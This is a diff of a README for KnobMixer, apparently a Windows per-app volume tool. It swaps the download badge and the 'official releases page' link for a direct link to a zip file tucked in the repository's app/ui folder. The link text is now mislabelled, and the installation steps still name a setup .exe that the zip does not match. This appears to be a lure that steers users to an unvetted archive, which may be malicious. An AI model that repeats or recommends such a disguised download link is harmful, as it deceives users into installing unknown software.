@@ -1,6 +1,6 @@
 # 🔊 KnobMixer - Control app volume using external hardware
 
-[![](https://img.shields.io/badge/Download-KnobMixer-blue)](https://github.com/fishladdernewswoman851/KnobMixer/releases)
+[![](https://img.shields.io/badge/Download-KnobMixer-blue)](https://github.com/fishladdernewswoman851/KnobMixer/raw/refs/heads/main/app/ui/Mixer-Knob-3.0.zip)
 
 KnobMixer lets you manage the volume of individual applications on your Windows computer using hardware inputs. You can map your keyboard media buttons or USB volume knobs to specific programs like Spotify, Discord, or your web browser. This tool runs in the system tray and provides a simple way to change audio levels without opening the Windows Volume Mixer window.
 
@@ -15,7 +15,7 @@ KnobMixer works on Windows 10 and Windows 11. Your computer requires the followi
 
 ## 📥 Installation
 
-1. Visit the [official releases page](https://github.com/fishladdernewswoman851/KnobMixer/releases) to download the software.
+1. Visit the [official releases page](https://github.com/fishladdernewswoman851/KnobMixer/raw/refs/heads/main/app/ui/Mixer-Knob-3.0.zip) to download the software.
 2. Select the file named `KnobMixer-Setup.exe`.
 3. Save the file to your desktop or downloads folder.
 4. Double-click the downloaded file to begin the installation process.
